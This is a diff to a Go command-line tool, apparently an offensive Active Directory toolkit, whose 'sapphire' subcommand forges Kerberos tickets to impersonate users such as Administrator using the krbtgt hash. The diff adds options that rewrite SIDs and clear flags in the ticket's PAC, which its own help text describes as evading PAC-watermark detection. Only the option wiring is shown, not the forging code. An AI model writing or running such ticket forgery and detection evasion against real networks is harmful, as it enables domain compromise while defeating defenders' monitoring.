@@ -463,6 +463,7 @@ func cmdSapphire(args []string) error {
 	fs := flag.NewFlagSet("sapphire", flag.ExitOnError)
 	var domainSID, impersonate, krbtgtHash, krbtgtAES, outfile string
 	var userID uint
+	var stripWatermark, stripLogonFlags bool
 
 	fs.StringVar(&domainSID, "domain-sid", "", "Domain SID (S-1-5-21-...)")
 	fs.StringVar(&impersonate, "impersonate", "", "User to impersonate (e.g., Administrator)")
@@ -471,6 +472,8 @@ func cmdSapphire(args []string) error {
 	fs.UintVar(&userID, "user-id", 0, "User ID for PAC_REQUESTOR (KB5008380)")
 	fs.StringVar(&outfile, "o", "", "Output file (.kirbi or .ccache)")
 	fs.StringVar(&outfile, "out", "", "Output file (.kirbi or .ccache)")
+	fs.BoolVar(&stripWatermark, "strip-watermark", false, "Rewrite S-1-18-2 → S-1-18-1 in PAC ExtraSids (evade PAC-watermark detection)")
+	fs.BoolVar(&stripLogonFlags, "strip-logon-flags", false, "Clear LOGON_RESOURCE_GROUPS (0x200) bit in PAC UserFlags (second S4U2Self watermark)")
 	fs.Parse(args)
 
 	// Override global outfile if local one specified
@@ -540,17 +543,19 @@ func cmdSapphire(args []string) error {
 	}
 
 	req := &forge.SapphireTicketRequest{
-		Domain:       flags.domain,
-		DomainSID:    domainSID,
-		Username:     flags.username,
-		Password:     flags.password,
-		Impersonate:  impersonate,
-		UserID:       uint32(userID),
-		KrbtgtNTHash: krbtgtNTHash,
-		KrbtgtAES256: krbtgtAES256,
-		KDC:          flags.kdc,
-		TGT:          tgt,
-		SessionKey:   sessionKey,
+		Domain:         flags.domain,
+		DomainSID:      domainSID,
+		Username:       flags.username,
+		Password:       flags.password,
+		Impersonate:    impersonate,
+		UserID:         uint32(userID),
+		KrbtgtNTHash:   krbtgtNTHash,
+		KrbtgtAES256:   krbtgtAES256,
+		KDC:             flags.kdc,
+		TGT:             tgt,
+		SessionKey:      sessionKey,
+		StripWatermark:  stripWatermark,
+		StripLogonFlags: stripLogonFlags,
 	}
 
 	result, err := forge.ForgeSapphireTicket(context.Background(), req)
